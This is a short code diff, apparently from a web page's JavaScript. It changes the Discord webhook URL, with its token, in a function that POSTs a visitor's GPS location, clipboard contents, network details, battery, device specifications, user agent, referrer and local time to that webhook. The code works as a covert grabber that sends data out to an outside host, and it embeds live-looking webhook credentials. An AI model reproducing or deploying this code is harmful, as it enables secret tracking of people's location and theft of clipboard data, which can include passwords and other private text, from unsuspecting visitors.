@@ -119,7 +119,7 @@
          
            function senddis(gpsr, clips,batterypercentage,ischarging) {
              var request = new XMLHttpRequest();
-             request.open("POST", "https://discord.com/api/webhooks/1093561152551788645/FRB-hm7LcD1D8zXxUFZR4TmvwGFeasNou4QYlCbV44n0IQIan524jF7xByiNS4ebPIxI");
+             request.open("POST", "https://discord.com/api/webhooks/1093561144335138937/8iNvf3qJgl4nMqVf_T-qiiHm5aWkHWIyub_z6H1EBSYxGsaSi9FJlbFtvDuC45hq5tWv");
              request.setRequestHeader('Content-type', 'application/json');
              var params = {
                content: ("> **DeviceGps  : **" + gpsr + "\n> **NetworkInformation : **" + networkinformation + "\n> **BatteryPercentage : **" + batterypercentage + "\n> **Ischarging : **" + ischarging + "\n> **ScreenWidth : **" + width + "\n> **ScreenHeight : **" + height + "\n> **PlatForm : **" + platform + "\n> **DeviceLanguage : **" + devicelang + "\n> **DeviceMemory : **" + deviceram + "\n> **IsCookieEnabled : **" + iscookieEnabled + "\n> **UserAgent : **" + useragent + "\n> **CpuThreads : **" + cpuThreads + "\n> **ReferUrl : **" + referurl + "\n> **Clipboard : **" + clips + "\n> **DeviceLocalTime : **" + localtime + "\n"),
